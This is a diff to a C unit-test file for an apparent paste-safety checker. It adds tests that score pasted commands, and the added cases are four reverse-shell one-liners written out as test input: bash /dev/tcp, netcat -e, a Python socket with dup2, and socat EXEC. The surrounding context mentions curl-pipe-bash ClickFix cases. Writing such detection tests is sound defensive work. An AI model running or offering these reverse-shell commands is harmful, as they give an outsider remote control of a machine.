@@ -223,6 +223,35 @@ static void test_paste_php_eval(void) {
           "php -r one-liner must trigger P5");
 }
 
+static void test_paste_revshell_dev_tcp(void) {
+    TEST("Paste: bash /dev/tcp reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1");
+    CHECK(v.score >= 60, "bash /dev/tcp must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_nc_e(void) {
+    TEST("Paste: netcat -e reverse shell → P9");
+    PasteVerdict v = hlse_check_paste("nc -e /bin/sh 192.168.1.100 4444");
+    CHECK(v.score >= 60, "nc -e reverse shell must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_python_socket(void) {
+    TEST("Paste: Python socket reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "python3 -c 'import socket,os;s=socket.socket();"
+        "s.connect((\"1.2.3.4\",4444));"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)'");
+    CHECK(v.score >= 60, "Python socket/os.dup2 must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_socat(void) {
+    TEST("Paste: socat reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid");
+    CHECK(v.score >= 60, "socat TCP/EXEC must trigger P9 (score >= 60)");
+}
+
 static void test_paste_osascript(void) {
     TEST("Paste: osascript 'do shell script curl|bash' → P8 macOS ClickFix");
     PasteVerdict v = hlse_check_paste(
@@ -286,6 +315,10 @@ int main(void) {
     test_paste_python_download_exec();
     test_paste_node_eval();
     test_paste_php_eval();
+    test_paste_revshell_dev_tcp();
+    test_paste_revshell_nc_e();
+    test_paste_revshell_python_socket();
+    test_paste_revshell_socat();
 
     printf("\nNetwork safety:\n");
     test_network_runs();
